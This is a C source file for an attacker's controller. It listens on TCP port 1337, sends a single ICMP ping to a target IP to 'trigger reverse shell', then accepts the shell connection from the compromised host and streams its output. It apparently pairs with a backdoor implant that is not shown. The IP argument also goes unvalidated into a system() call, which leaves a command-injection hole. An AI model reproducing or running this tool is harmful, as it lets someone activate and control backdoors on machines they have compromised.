#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 1337

int send_icmp(char *argv[]) {
    char command[256];
    snprintf(command, sizeof(command), "ping -c 1 -W 1 -t 1 %s", argv[1]);
    return system(command);
}

int main(int argc, char *argv[]) {
	if (argc != 2) {
		fprintf(stderr, "Usage: %s <ip>\n", argv[0]);
		return (1);
	}

    struct sockaddr_in sa;
    struct sockaddr_in accept_addr;
    socklen_t b;
    int s, c;
    int opt = 1;

    /* Create listening socket */
    if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        return 1;
    }

    /* Initialise socket address */
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);

    // Set socker reuse before calling bind()
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt");
        return 1;
    }

    /* Bind socket and make it listen */
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind");
        close(s);
        return 1;
    }
    listen(s, 4);

    printf("[*] Sending ICMP ECHO packet to target\n");

    /* Send ICMP ECHO to trigger reverse shell */
    if (send_icmp(argv) < 0) {
        printf("Error: failed to send ICMP packet\n");
        close(s);
        return 1;
    }

    /* Accept reverse shell connection */
    if ((c = accept(s, (struct sockaddr *) &accept_addr, &b)) < 0) {
        perror("accept");
        return 1;
    }

	printf("[+] Connected — streaming logs:\n");

	struct pollfd pfd = {
		.fd = c,
		.events = POLLIN
	};

	char buf[4096];
	for (;;) {
		int rc = poll(&pfd, 1, -1);
		if (rc < 0) {
			if (errno == EINTR)
				continue;
			perror("poll");
			break;
		}

		if (pfd.revents & POLLIN) {
			ssize_t n = read(c, buf, sizeof(buf));
			if (n <= 0)
				break;
			fwrite(buf, 1, (size_t)n, stdout);
			fflush(stdout);
		}

		if (pfd.revents & (POLLHUP | POLLERR | POLLNVAL))
			break;
	}

	close(c);
	close(s);
	return (0);
}